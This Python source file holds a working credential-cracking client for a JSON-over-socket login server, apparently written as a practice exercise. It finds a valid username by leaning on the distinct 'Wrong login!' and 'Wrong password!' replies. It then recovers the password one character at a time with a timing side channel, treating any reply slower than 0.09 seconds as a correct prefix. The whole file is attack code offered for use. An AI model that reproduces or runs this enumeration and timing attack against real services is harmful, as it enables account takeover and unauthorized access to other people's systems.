import socket
import itertools
import json
import time


class ClientSocketJson:
    def __init__(self, address: (tuple or str), buffer_size, login_base: list[str]):
        self.address = address
        self.buffer_size = buffer_size
        self.login_base = login_base
        self.client_socket = socket.socket()

    def __enter__(self):
        self.client_socket.connect(self.address)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        try:
            self.client_socket.close()
        except:
            return True

    def check_exceptions(self, login, password=''):
        request = json.dumps(
        {
            "login": login,
            "password": password
        }).encode()
        self.client_socket.send(request)
        response = json.loads(self.client_socket.recv(self.buffer_size).decode())

        result = response['result']

        if result == "Wrong login!":
            return 'login'
        if result == "Wrong password!":
            return 'password'
        if result == "Connection success!":
            return 'success'

    def find_login(self):
        for login in self.login_base:
            if self.check_exceptions(login) == 'password':
                return login

    def bruteforce_password_vulnerability(self):
        login = self.find_login()
        password = ''
        password_symbol_filter = [chr(x) for x in itertools.chain(range(ord('a'), ord('z') + 1),
                                                                  range(ord('0'), ord('9') + 1),
                                                                  range(ord('A'), ord('Z') + 1))]
        exception = self.check_exceptions(login)

        while True:
            for symbol in password_symbol_filter:
                tmp_password = password + symbol
                before_auth = time.time()
                exception = self.check_exceptions(login, tmp_password)
                after_auth = time.time()
                if ((after_auth - before_auth) >= 0.09) or exception == 'success':
                    password += symbol
                    break

            if exception == 'success':
                return json.dumps({
                                  "login": login,
                                  "password": password
                                  })


